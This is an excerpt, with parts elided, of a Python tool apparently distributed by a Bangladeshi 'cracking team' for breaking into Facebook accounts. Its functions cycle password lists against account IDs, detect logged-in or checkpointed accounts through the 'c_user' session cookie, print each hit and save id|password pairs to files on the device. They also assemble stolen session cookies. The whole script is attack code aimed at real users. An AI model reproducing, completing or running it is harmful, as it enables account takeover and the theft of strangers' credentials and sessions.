...
╰╯╰╯╱╰━━━┻╯╱╰━╯╱╰╯╰╯
⊰᯽⊱┈──╌❊╌──┈⊰᯽⊱
>>  Owner    : Cyber-tony-BD-71
>>  Facebook : TONY SHANKHARI
>>  Version  : 1.0
>>  GITHUB❤    : Cyber-tony-BD-71
⊰᯽⊱┈──╌❊╌──┈⊰᯽⊱""")
def linex():
	print('\033[1;37m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> BD-71 TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				...
				os.system('python Cyber-tony-BD-71.py')
			elif xd in ['2','02']:
				menu()
			elif xd in ['3','03']:
				bd()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[TONY] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[TONY-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/TONY-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[TONY-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/TONY-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[TONY] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[TONY-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[TONY-CP] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[TONY-OK] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[38;5;208m[TONY-CP] '+cid+' | '+ps+'\33[0;97m')
